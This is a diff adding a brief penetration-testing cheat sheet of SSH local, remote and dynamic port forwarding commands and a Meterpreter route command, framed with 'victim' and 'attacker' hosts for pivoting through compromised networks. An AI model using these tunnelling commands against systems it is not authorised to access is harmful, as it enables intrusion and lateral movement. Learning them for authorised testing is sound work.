@@ -1,0 +1,21 @@
+#SSH Local Port Forwarding(on local machine)
+
+#localIP:9999 <-- 192.168.1.100:80 
+ssh -L 9999:127.0.0.1:80 victim@192.168.1.100
+
+#localIP:9999 <-- 192.168.1.100 <-- 192.169.1.200:80
+ssh -L 9999:192.168.1.200:80 victim@192.168.1.100
+
+#SSH Remote Port Forwarding(on remote machine)
+
+#remoteIP:80 --> attackerIP:9999
+ssh -R 9999:127.0.0.1:80 attacker@attackerIP
+
+#Dynamic Port Forwarding(For proxychains)
+
+ssh -D 8888 victim@victimIP
+
+#Meterpreter
+
+route add 192.168.1.0 255.255.255.0 SessionID
+
